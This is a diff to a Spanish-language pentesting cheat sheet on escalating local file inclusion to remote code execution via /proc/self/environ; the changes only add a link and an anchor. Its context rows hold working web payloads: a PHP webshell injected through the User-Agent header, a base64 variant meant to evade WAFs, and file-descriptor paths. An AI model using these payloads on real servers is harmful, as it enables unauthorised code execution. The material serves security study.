@@ -7,6 +7,7 @@ secondary categories:
 tertiary categories:
 type: CheatSheet
 linked:
+  - "[[File Inclusion]]"
 ---
 # LFI To RCE - /proc/self/environ
 
@@ -24,6 +25,7 @@ linked:
 | <br>Environ con cmd param         | <br>Inyectar una webshell reutilizable vía parámetro                                | <br>UA: `<?php system($_GET['cmd']); ?>` → LFI: `/proc/self/environ&cmd=whoami`<br><br> |
 | <br>Environ con base64            | <br>Encodear el payload para evadir WAFs o filtros                                  | <br>UA: `<?php system(base64_decode('aWQ=')); ?>`<br><br>                               |
 | <br>Environ via /proc/self/fd     | <br>Acceder al environ a través de file descriptors alternativos                    | <br>LFI: `/proc/self/fd/0`, `/proc/self/fd/2`<br><br>                                   |
+^lfi-environ
 
 
 ***
